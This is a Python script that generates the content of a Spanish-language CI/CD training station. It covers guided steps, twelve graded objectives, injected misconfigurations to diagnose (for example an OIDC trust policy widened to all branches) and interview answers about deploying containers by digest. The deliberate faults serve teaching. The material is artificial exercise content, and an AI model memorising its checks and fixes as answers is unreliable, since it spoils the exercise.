    explica="Antes de escribir el camino, mira sus dos extremos. En el ECR, cada imagen tiene un tag (el commit) y un digest; dos imágenes perdieron su tag. En el repositorio de despliegue, cada ambiente pide su imagen por digest, con el commit en un comentario. El GitOps compara lo que se pide con lo que corre.",
    codigo=[],
    comandos=[
        cmd("git remote -v", L("p1 remote"), "Tu <code>origin</code> es la forja: lo que subas ahí es lo que «ve GitHub»."),
        cmd("python mundo/nube.py ecr describir classifier-gateway", L("p1 describir"), "MUTABLE: así nace un repositorio en ECR."),
        cmd("python mundo/nube.py ecr imagenes classifier-gateway | head -6", L("p1 imagenes")),
        cmd("git --git-dir=.forja/despliegue.git show main:produccion/gateway.yaml", L("p1 despliegue")),
        cmd("python mundo/gitops.py estado", L("p1 gitops")),
    ],
    verifica="Sabes leer un tag, un digest y qué digest corre en cada ambiente.",
    ojo="Producción no pide <code>classifier-gateway:&lt;commit&gt;</code>: pide <code>@sha256:…</code>. El commit va en un comentario, para las personas."))

G.append(dict(n=2, id="inmutable", titulo="Tags que no se mueven", objetivo="El repositorio del gateway con tags inmutables, antes de que el CI suba nada.",
    conceptos=["tag-inmutable"],
    explica="Con tags que se pueden mover, un rerun de un commit ya publicado reconstruye la imagen (casi nunca da los mismos bytes) y mueve el tag: lo que se probó ya no es lo que baja quien pide por nombre. Con tags inmutables, ese push se rechaza.",
    codigo=[],
    comandos=[
        cmd("python mundo/nube.py ecr configurar classifier-gateway --inmutable", L("p2 configurar"), "En C01: <code>aws ecr put-image-tag-mutability</code>, o mejor, en el Terraform del repositorio."),
        cmd(f"{V} inmutable", "(pasa cuando haya al menos dos imágenes con tag; ya las hay)"),
    ],
    verifica="<code>describir</code> dice IMMUTABLE. En el paso 6 lo vas a ver rechazar un push.",
    ojo="Nada de lo que ya corre cambia: la inmutabilidad protege los nombres de aquí en adelante."))

G.append(dict(n=3, id="workflow-pr", titulo="El workflow del PR", objetivo="Un workflow que corre lint y pruebas en cada PR, sin filtro de carpetas, con permisos mínimos y sin pegar texto de fuera en un comando.",
    conceptos=["workflow-actions", "disparadores", "check-obligatorio", "permisos-minimos", "inyeccion-expresiones"],
    explica="Empieza por la mitad que corre en cada PR: dos jobs a la vez, cada uno con su checkout. El título del PR va al resumen por <code>env</code>, nunca dentro del <code>run</code>. Sube la rama, abre el PR en la forja y mira la corrida. La última celda muestra la trampa de los filtros de carpetas con el mismo motor de la forja.",
    codigo=[{"lang": "yaml", "path": ".github/workflows/gateway.yml (la primera mitad)", "code": code(".github/workflows/gateway.yml").split("\n  imagen:\n")[0].rstrip(), "nota": "<code>pruebas</code> es el nombre que pide el check obligatorio de <code>mundo/forja.yaml</code>."}],
    comandos=[
        cmd("git switch -c ci-gateway\ngit add .github && git commit -m \"ci: lint y pruebas en cada PR\"\ngit push origin ci-gateway", L("p3 commit")),
        cmd("python mundo/forja.py pr abrir ci-gateway --titulo \"CI del gateway: lint y pruebas\"", L("p3 pr")),
        cmd("python -c \"…se_dispara con paths: [gateway/**]…\"", L("p3 trampa"), "Con <code>paths</code>, un PR que solo cambia <code>gateway.yaml</code> o el README nunca reporta <code>pruebas</code>, y se queda esperando para siempre."),
        cmd(f"{V} permisos inyeccion", "(pasan cuando el workflow esté en main: paso 6)"),
    ],
    verifica="La corrida del PR: lint y pruebas en verde, y la forja dice «se puede juntar». Todavía no lo juntes.",
    ojo="Un <code>run:</code> en una sola línea con « #» adentro se corta: YAML lo toma por comentario. Usa <code>run: |</code> (bloque)."))

G.append(dict(n=4, id="imagen", titulo="Construir, probar y escanear la imagen", objetivo="La imagen del gateway construida una vez, con su prueba de humo y su escaneo, primero en tu terminal.",
    conceptos=["construir-una-vez", "prueba-humo-imagen", "sbom-escaneo"],
    explica="Antes de ponerlo en el workflow, corre cada pieza en tu terminal: el build, el humo (la imagen prendida en la red del mundo, con su <code>TRITON_URL</code>) y el escaneo. El escaneo completo muestra tres avisos; la política del equipo (CRITICAL con parche) y la excepción con fecha dejan cero.",
    codigo=[{"lang": "bash", "path": "ci/humo.sh", "code": code("ci/humo.sh"), "nota": "El <code>trap</code> apaga el contenedor pase lo que pase; <code>-p 127.0.0.1::8080</code> toma un puerto libre."},
            {"lang": "bash", "path": "ci/escaneo.sh", "code": code("ci/escaneo.sh"), "nota": "Dos pasadas: el SBOM completo para guardarlo, y el escaneo con la política del equipo, que es el que puede detener el push."},
            {"lang": "yaml", "path": ".trivyignore.yaml", "code": code(".trivyignore.yaml"), "nota": "La excepción dice por qué no aplica y vence: el 31 de diciembre alguien la vuelve a mirar."}],
    comandos=[
        cmd("export IMG=localhost:5800/classifier-gateway:prueba\ndocker build -q -f gateway/Dockerfile -t $IMG .", L("p4 build", quitar=r"^real ")),
        cmd("bash ci/humo.sh $IMG", L("p4 humo")),
        cmd("python mundo/escaner.py image $IMG", L("p4 escaneo-todo"), "Todo lo que encuentra, sin política."),
        cmd("bash ci/escaneo.sh $IMG", L("p4 escaneo"), f"El SBOM ({SBOM_N} paquetes) y el escaneo con la política del equipo."),
    ],
    verifica="El humo dice <code>humo: ok</code> y el escaneo con política termina en <code>Total: 0</code>.",
    ojo="El tag <code>prueba</code> nunca se sube: es solo para tu terminal. En el workflow, el tag es el commit."))

G.append(dict(n=5, id="push", titulo="Subir con credenciales que vencen", objetivo="El push a ECR con el rol del CI, por OIDC, y el digest como salida del paso.",
    conceptos=["oidc", "permisos-minimos"],
    explica="<code>ci/push.sh</code> cambia el token OIDC del job por una contraseña de ECR, entra, sube y saca el digest de la salida de <code>docker push</code>. En tu terminal no hay token: no hay forma de subir desde tu laptop, y eso es parte del diseño.",
    codigo=[{"lang": "bash", "path": "ci/push.sh", "code": code("ci/push.sh"), "nota": "El digest sale de lo que contestó el registro (la última línea de <code>docker push</code>), no de un cálculo propio."},
            {"lang": "json", "path": "mundo/nube/confianza.json (el rol del CI, del equipo de nube)", "code": json.dumps(json.loads((KIT / "mundo/nube/confianza.json").read_text())["roles"]["gha-classifier-gateway"]["trust_policy"], ensure_ascii=False, indent=2), "nota": "El <code>sub</code> exacto de main: el token de un PR dice <code>repo:dojo/classifier:pull_request</code> y no entra."}],
    comandos=[
        cmd("ROL=arn:aws:iam::000000000000:role/gha-classifier-gateway GITHUB_OUTPUT=/dev/null bash ci/push.sh $IMG", L("p5 sin-token"), "Sin <code>permissions: id-token: write</code>, el job tampoco lo tendría."),
    ],
    verifica="Fuera de un job no hay credenciales. Dentro, el paso 6 lo muestra.",
    ojo="La contraseña de <code>docker login</code> queda en el <code>DOCKER_CONFIG</code> de la carpeta del job, que se borra al terminar."))

G.append(dict(n=6, id="workflow-main", titulo="El workflow completo: imagen, staging y producción", objetivo="Después del merge, la imagen una vez, staging y producción por digest, con la aprobación de otra persona; y un rerun que choca con el tag.",
    conceptos=["needs-if-outputs", "gitops", "ambientes-aprobacion"],
    explica="Completa el workflow: el job <code>imagen</code> (solo en push, con <code>id-token: write</code> y el digest como output) y los jobs de staging y producción, que leen <code>needs.imagen.outputs.digest</code> y despliegan con <code>ci/desplegar.sh</code>. Actualiza el PR, júntalo, mira la corrida y aprueba producción como <code>revisora</code>. Después, haz rerun de la misma corrida.",
    codigo=[{"lang": "yaml", "path": ".github/workflows/gateway.yml", "code": code(".github/workflows/gateway.yml"), "nota": "staging y produccion leen <code>needs.imagen.outputs.digest</code>: nunca vuelven a calcular «la imagen de este commit» por su tag."},
            {"lang": "bash", "path": "ci/desplegar.sh", "code": code("ci/desplegar.sh"), "nota": "El hook del repositorio de despliegue aplica el cambio en el push; el script comprueba que el ambiente corre ese digest y le pide una foto."}],
    comandos=[
        cmd("git add -A && git commit -m \"ci: imagen, staging y produccion por digest\"\ngit push origin ci-gateway\npython mundo/forja.py pr abrir ci-gateway", L("p6 pr")),
        cmd("python mundo/forja.py pr merge 1", L("p6 merge", quitar=r"^real "), f"Del merge a la espera de la aprobación: ≈ {round(float(MERGE_S))} s."),
        cmd("python mundo/forja.py aprobar 3 --como tu", L("p6 aprobar-tu")),
        cmd("python mundo/forja.py aprobar 3 --como revisora", L("p6 aprobar")),
        cmd("python mundo/forja.py corrida 3", L("p6 corrida")),
        cmd("python mundo/forja.py corrida 3 --job imagen   # el paso push", L("p6 log-push", filtro=r"^(rol |Login|.*digest: |subida|.*Pushed$|.*Layer already)"), "Solo viajan las capas nuevas; las de la base y el entorno ya estaban."),
        cmd("python mundo/gitops.py estado", L("p6 gitops")),
        cmd("python mundo/nube.py ecr imagenes classifier-gateway | head -4", L("p6 imagenes")),
        cmd("python ci/foto.py | curl -s -X POST --data-binary @- -H \"Content-Type: image/jpeg\" \"localhost:8802/v1/classify?top_k=3\"", L("p6 classify")),
        cmd("git switch main && git pull origin main\npython mundo/forja.py rerun 3", L("p6 rerun"), "El rerun reconstruye y el registro rechaza el push: ese tag ya nombra la imagen probada."),
    ],
    verifica="La corrida en éxito, aprobada por <code>revisora</code>; staging y producción corren el digest del job imagen; el rerun falla en el push.",
    ojo="El rerun en rojo no es un bug: la imagen de ese commit ya existe y no hay nada que volver a subir. Si el repositorio fuera MUTABLE, el rerun habría movido el tag a otra imagen sin que nadie se enterara."))

G.append(dict(n=7, id="retencion", titulo="La regla de retención", objetivo="Una regla que borra lo que perdió su tag y guarda las 30 imágenes más nuevas, revisada con su vista previa.",
    conceptos=["retencion"],
    explica="La regla vive en git (<code>infra/ecr-retencion.json</code>) y se aplica al repositorio. Antes de que corra, la vista previa dice qué borraría. Cuenta imágenes, no días: así la que corre y la anterior siempre quedan.",
    codigo=[{"lang": "json", "path": "infra/ecr-retencion.json", "code": code("infra/ecr-retencion.json"), "nota": "La regla 1 toma primero las imágenes sin tag; la 2, todas las demás (<code>*</code>), y guarda las 30 más nuevas."}],
    comandos=[
        cmd("python mundo/nube.py ecr politica-retencion classifier-gateway infra/ecr-retencion.json", L("p7 politica")),
        cmd("python mundo/nube.py ecr retencion classifier-gateway --vista-previa", L("p7 vista")),
    ],
    verifica=f"La vista previa borraría {N_BORRA} imágenes: las 2 sin tag y las más viejas, ninguna de las que corren.",
    ojo="ECR borra una imagen dentro de las 24 h en que cumple la regla, y no sabe qué corre en el clúster: la vista previa es tu única oportunidad de verlo antes."))

G.append(dict(n=8, id="rollback", titulo="Rollback en segundos", objetivo="Volver producción a la imagen anterior con un git revert, y regresar.",
    conceptos=["rollback"],
    explica="El último commit del repositorio de despliegue es el de producción. Revertirlo pide otra vez el digest anterior, que sigue en el registro: el hook lo aplica en el push. Después, revertir el revert te devuelve a la nueva.",
    codigo=[],
    comandos=[
        cmd("git clone .forja/despliegue.git ../despliegue\ngit -C ../despliegue log --oneline", L("p8 log")),
        cmd("cd ../despliegue && git revert --no-edit HEAD && time git push origin main", L("p8 revert", quitar=r"^(user|sys) "), f"≈ {round(float(ROLLBACK_S))} s, incluido bajar la imagen y esperar a que quede lista."),
        cmd("python mundo/gitops.py estado", L("p8 gitops")),
        cmd("cd ../despliegue && git revert --no-edit HEAD && git push origin main", L("p8 adelante")),
        cmd(V, L("p9 verificar", filtro=r"en verde|^✗")),
    ],
    verifica="Producción vuelve a la anterior y regresa, cada vez con un commit; los 12 checks en verde.",
    ojo="Un rollback no le avisa al workflow: el siguiente merge vuelve a desplegar lo nuevo. Si lo nuevo está roto, el arreglo va por PR, como todo."))

REPARTO = {
    1: (["ci-cd", "registro-imagenes", "tag-digest", "gitops"], ["capas"]),
    2: (["tag-inmutable"], []),
    3: (["workflow-actions", "disparadores", "check-obligatorio", "permisos-minimos", "inyeccion-expresiones"], []),
    4: (["construir-una-vez", "prueba-humo-imagen", "sbom-escaneo"], []),
    5: (["oidc"], ["credenciales"]),
    6: (["needs-if-outputs", "ambientes-aprobacion"], ["camino"]),
    7: (["retencion"], ["retencion"]),
    8: (["rollback"], []),
}
for g in G:
    if g["n"] in REPARTO:
        c, p = REPARTO[g["n"]]
        g["en_pagina"] = {"conceptos": c, "precalculos": p}
e["guiado"] = G

e["solo"] = {
    "reglas": [
        "Empieza con el kit recién descomprimido en una carpeta nueva (apaga antes el mundo anterior: <code>docker rm -f taller-c01-cicd-gw-staging taller-c01-cicd-gw-produccion</code> y <code>docker compose down -v</code>).",
        "Sin <code>GUION.md</code>: solo estos objetivos y el contrato arriba de cada archivo.",
        "Cada objetivo tiene su check; corre <code>python verificar.py &lt;check&gt;</code> cuando creas que quedó.",
        "Las reglas no se tocan: <code>mundo/</code>, <code>gateway/</code> y la configuración de otros equipos se quedan como vienen. Nada de push directo a main.",
    ],
    "objetivos": [
        {"n": 1, "objetivo": "El ECR y el Triton del dojo arriba, el mundo creado y los dos ambientes corriendo.", "check": "mundo"},
        {"n": 2, "objetivo": "Trabajas con la protección de main y los roles revisados: un PR no puede asumir el rol que sube imágenes.", "check": "reglas"},
        {"n": 3, "objetivo": "Un workflow en main que en cada PR corre lint y pruebas (en todos los PR), y después del merge construye la imagen, la lleva a staging y, con aprobación, a producción, con el digest como salida.", "check": "workflow", "pista": "¿Qué pasa con un PR que solo cambia el README?"},
        {"n": 4, "objetivo": "Permisos mínimos: contents: read para todos e id-token: write solo donde se sube la imagen.", "check": "permisos"},
        {"n": 5, "objetivo": "Ningún run pega texto de fuera (título del PR, nombre de rama) dentro del comando.", "check": "inyeccion"},
        {"n": 6, "objetivo": "Al menos un PR juntado; en los PR nunca corre el job que publica.", "check": "pr"},
        {"n": 7, "objetivo": "La última corrida de main dejó en el ECR la imagen con el commit como tag, con humo y escaneo antes del push, y el digest que reportó es el que nombra el tag.", "check": "imagen", "pista": "¿De dónde sale el digest: de un cálculo tuyo o de lo que contestó el registro?"},
        {"n": 8, "objetivo": "El repositorio del gateway no deja mover un tag.", "check": "inmutable"},
        {"n": 9, "objetivo": "Staging y producción corren por digest, y producción corre exactamente el digest que construyó y probó tu corrida.", "check": "digest"},
        {"n": 10, "objetivo": "Producción la aprobó un revisor que no disparó la corrida, después de staging.", "check": "aprobacion"},
        {"n": 11, "objetivo": "La imagen de producción no tiene avisos CRITICAL con parche, y cada excepción del escaneo tiene motivo y vence.", "check": "escaneo"},
        {"n": 12, "objetivo": "Una regla de retención que limpia y nunca borra la imagen que corre ni la del rollback.", "check": "retencion", "pista": "¿Cuenta días o imágenes?"},
    ],
}

FAL = []


def falla(id_, titulo, tipo, historia, sintoma, hipotesis, confirma_code, confirma_salida, arreglo, concepto, check, nota=""):
    FAL.append(dict(id=id_, titulo=titulo, tipo=tipo, historia=historia, sintoma=sintoma, hipotesis=hipotesis,
                    confirma=cmd(confirma_code, confirma_salida, nota), arreglo=arreglo, concepto=concepto, check=check))


if LOGF:
    falla("check-fantasma", "El check que nunca llega", "config",
          "Tu siguiente PR tiene lint y pruebas en verde, pero la forja no lo deja juntar: «esperando el resultado de test». Nadie del equipo tiene un job que se llame test.",
          "<code>verificar.py</code>: " + F("check-fantasma verificar", filtro=r"^✗"),
          ["Cambió la protección de main.", "Tu workflow dejó de correr en los PR.", "Las pruebas fallan."],
          "git log -1 -p --format='%h %an: %s' -- mundo/forja.yaml", F("check-fantasma confirma", filtro=r"^[0-9a-f]{7}|^[-+] "),
          "El equipo de plataforma cambió <code>mundo/forja.yaml</code> directo en main, sin revisión: el check obligatorio ahora es <code>test</code>. Tu workflow nunca reporta un job con ese nombre, así que ningún PR se puede juntar: un check obligatorio que nadie produce se queda esperando para siempre, igual que con un filtro de carpetas. Arreglo: <code>git revert</code> del commit. El nombre del check obligatorio y el del job cambian juntos.",
          "check-obligatorio", "reglas")
    falla("confianza-abierta", "Previews para todos", "config",
          "El equipo de nube avisa en el canal: «abrimos el rol del CI a todo el repositorio para un job de previews; ya no tienen que pedirnos nada». Todo sigue en verde.",
          "<code>verificar.py</code>: " + F("confianza-abierta verificar", filtro=r"^✗"),
          ["Cambió la trust policy del rol del CI.", "Cambiaron los permisos de tu workflow.", "Alguien subió una imagen a mano."],
          "git log -1 -p --format='%h %an: %s' -- mundo/nube/confianza.json", F("confianza-abierta confirma"),
          "La trust policy pasó de <code>StringEquals sub = repo:dojo/classifier:ref:refs/heads/main</code> a <code>StringLike repo:dojo/classifier:*</code>. Ahora el job de un PR, que corre código que nadie revisó, puede cambiar su token por credenciales que suben al ECR de producción. No falla nada: es un hueco. Arreglo: <code>git revert</code> del commit. Un job de previews lleva su propio rol, con permisos sobre otro repositorio.",
          "oidc", "reglas")
    falla("tag-movible", "El Terraform viejo", "infra",
          "El equipo de nube corrió un Terraform de hace meses para arreglar otra cosa. Todo sigue funcionando.",
          "<code>verificar.py</code>: " + F("tag-movible verificar", filtro=r"^✗"),
          ["El repositorio volvió a dejar mover tags.", "Alguien movió un tag.", "Se borró una imagen."],
          "python mundo/nube.py ecr describir classifier-gateway", F("tag-movible confirma"),
          "El repositorio volvió a MUTABLE, como lo crea ECR si nadie dice otra cosa (y como decía el Terraform viejo). No se rompe nada hoy; el día de un rerun, el tag pasa a otra imagen y el nombre deja de decir la verdad. Producción no se entera porque despliega por digest, pero el tag ya no sirve para encontrar lo que corre. Arreglo: <code>python mundo/nube.py ecr configurar classifier-gateway --inmutable</code>, y en C01, <code>image_tag_mutability = \"IMMUTABLE\"</code> en el Terraform.",
          "tag-inmutable", "inmutable")
    falla("aviso-critico", "La versión que funcionaba", "mundo",
          "Beto juntó un PR chiquito: «gateway: fijar pyyaml 6.0.2 (la 6.0.3 rompe mi notebook)». Las pruebas pasaron. Ahora main está en rojo y producción no ha cambiado.",
          "<code>verificar.py</code>: " + F("aviso-critico verificar", filtro=r"^[✗✓]"),
          ["El escaneo frenó la imagen.", "Se cayó el ECR.", "Las pruebas de Beto estaban mal."],
          "python mundo/forja.py corrida <id>\npython mundo/forja.py corrida <id> --job imagen   # desde el escaneo", F("aviso-critico confirma", quitar=r"^\s+[✓–] (actions|echo|build|humo|el PR|ruff|python -m)"),
          "pyyaml 6.0.2 tiene un aviso CRITICAL con parche (DOJO-2026-0107, de la base de ejemplo). El job imagen construyó, pasó el humo y se detuvo en el escaneo, ANTES del push: la imagen nunca llegó al ECR y los dos ambientes siguen con la anterior. Es el pipeline haciendo su trabajo. Arreglo: una rama que regrese <code>pyyaml==6.0.3</code>, su PR, el merge y la aprobación de producción. Lo que no se hace: una excepción para un aviso que sí aplica y sí tiene parche.",
          "sbom-escaneo", "imagen")
    falla("despliegue-por-tag", "Más fácil de leer", "config",
          "Alguien de plataforma cambió el repositorio de despliegue: «produccion por tag, que se lee mejor que un sha256 de 64 letras». El canal dice que producción «no tomó el cambio».",
          "<code>verificar.py</code>: " + F("despliegue-por-tag verificar", filtro=r"^✗"),
          ["El repositorio de despliegue pide otra cosa.", "El GitOps se cayó.", "El ECR no tiene esa imagen."],
          "python mundo/gitops.py estado\ngit clone .forja/despliegue.git ../despliegue && cd ../despliegue\ngit log -1 -p --format=\"%h %an: %s\"", F("despliegue-por-tag confirma") + "\n" + F("despliegue-por-tag log"),
          "<code>produccion/gateway.yaml</code> pide la imagen por tag. La política de admisión la rechaza (un tag se puede mover; un digest, no) y producción sigue con la anterior: el repositorio pide una cosa y corre otra (en Argo CD: OutOfSync). Arreglo: <code>git revert</code> de ese commit en el repositorio de despliegue y <code>git push</code>: el hook vuelve a aplicar. Para leerlo, el comentario con el commit al lado del digest basta.",
          "gitops", "digest")
    falla("retencion-agresiva", "Ahorrar en el registro", "infra",
          "El equipo de nube vio la factura de ECR y, desde la consola, recortó la regla de retención de classifier-gateway: «con la última imagen basta». Todavía no ha corrido.",
          "<code>verificar.py</code>: " + F("retencion-agresiva verificar", filtro=r"^✗"),
          ["Cambió la regla aplicada en ECR.", "Cambió tu infra/ecr-retencion.json.", "Se borraron imágenes."],
          "python mundo/nube.py ecr retencion classifier-gateway --vista-previa | tail -4", F("retencion-agresiva confirma"),
          "La regla aplicada en ECR ya no es la de tu <code>infra/ecr-retencion.json</code>: guarda una sola imagen con tag. En cuanto ECR la aplique borraría la imagen anterior de producción, la del rollback: volver atrás dejaría de ser un cambio de digest de segundos y sería reconstruir un commit viejo (otro digest, sin probar). Arreglo: volver a aplicar la tuya, <code>python mundo/nube.py ecr politica-retencion classifier-gateway infra/ecr-retencion.json</code>. La regla vive en git; un cambio en la consola se pierde con el siguiente apply, o se lleva el rollback antes.",
          "retencion", "retencion")
e["fallas"] = FAL

e["listo"] = [
    "En cada PR corren lint y pruebas, en todos los PR, y main no acepta un PR sin pruebas en verde.",
    "La imagen se construye una vez por commit de main, se prueba (humo) y se escanea antes de subirla, con el commit como tag.",
    "El registro no deja mover un tag, y el CI sube con credenciales por OIDC que solo recibe main.",
    "Lo que viaja por el pipeline y lo que corre en staging y en producción es el digest, y producción lo aprueba otra persona.",
    "Una regla de retención limpia el registro sin tocar la imagen que corre ni la del rollback.",
    "Volver atrás es un git revert en el repositorio de despliegue, y tarda segundos.",
]

e["repaso"] = {
    "memo": "<b>Construir una vez, nombrar para siempre, desplegar por digest.</b> En el PR solo se prueba. Después del merge, la imagen se construye una vez, se prende (humo), se escanea y entonces se sube con el commit como tag inmutable; su digest sale como output y es lo único que viaja: a staging, y con la aprobación de otra persona, a producción, por un commit en el repositorio de despliegue. Las credenciales llegan por OIDC solo a main, y la retención cuenta imágenes para que el rollback siempre encuentre la suya.",
    "trampa": "Desplegar un tag (o <code>:latest</code>), reconstruir para producción «desde el mismo commit» o arreglar un rerun en rojo haciendo mutable el repositorio: en los tres casos corre algo que nadie probó.",
    "entrevista": [
        {"q": "Diseña el CI/CD de un servicio de inferencia en contenedores.", "a": "En cada PR, lint y pruebas, con un check obligatorio en main. Después del merge, un job construye la imagen una vez, la prueba con humo, genera el SBOM y la escanea (falla con críticos con parche), la sube a un registro con tags inmutables (tag = commit) y saca el digest como output. Staging y producción se despliegan por digest con GitOps; producción con aprobación de otra persona. Credenciales por OIDC a un rol que solo acepta main. Retención por número de imágenes."},
        {"q": "¿Por qué desplegar por digest y no por tag?", "a": "El tag es un nombre que alguien puede mover; el digest es la huella del contenido. Por digest, staging y producción corren los mismos bytes, el nodo comprueba lo que bajó y el rollback es pedir un digest que existe. El tag queda para las personas, en un comentario."},
        {"q": "Un rerun del pipeline falla en el push con ImageTagAlreadyExists. ¿Qué haces?", "a": "Nada que arreglar: el repositorio tiene tags inmutables y la imagen de ese commit ya se publicó; la reconstrucción traería otro digest. Si lo que quería era redesplegar, uso el digest que ya existe. No hago mutable el repositorio."},
        {"q": "¿Cómo le das credenciales de AWS a GitHub Actions sin guardar llaves?", "a": "OIDC: el job pide un token firmado por GitHub con permissions id-token: write, y AWS lo cambia por credenciales de un rol (AssumeRoleWithWebIdentity) si la trust policy acepta su sub y su aud. El sub lo fijo a la rama main (o a un environment), así un PR no puede asumir el rol. Las credenciales duran una hora."},
        {"q": "¿Qué escaneas y cuándo falla el pipeline?", "a": "La imagen ya construida, antes del push: SBOM y escaneo contra la base de CVE. Falla con un crítico que ya tiene parche; uno sin parche no se arregla subiendo una versión. Las excepciones viven en el repositorio, con motivo y fecha de vencimiento, y pasan por revisión. Además el registro reescanea lo que guarda."},
        {"q": "¿Cómo haces rollback en segundos?", "a": "Con GitOps y digest: un git revert en el repositorio de despliegue vuelve a pedir el digest anterior, que la retención garantiza que sigue en el registro. No se reconstruye nada; los nodos quizá ya la tienen. El arreglo de fondo va después, por PR."},
    ],
}

e["prompts"] = {
    "claude_md": "kits/c01-cicd/CLAUDE.md",
    "guiado": "content/estaciones/c01-cicd/prompts/guiado.md",
    "solo": "content/estaciones/c01-cicd/prompts/solo.md",
    "romper_ayuda": "content/estaciones/c01-cicd/prompts/romper-ayuda.md",
    "romper_solo": "content/estaciones/c01-cicd/prompts/romper-solo.md",
}

(APP / "content/estaciones/c01-cicd.json").write_text(json.dumps(e, ensure_ascii=False, indent=2) + "\n")
print("ok", len(json.dumps(e, ensure_ascii=False)), "· fallas:", len(FAL))
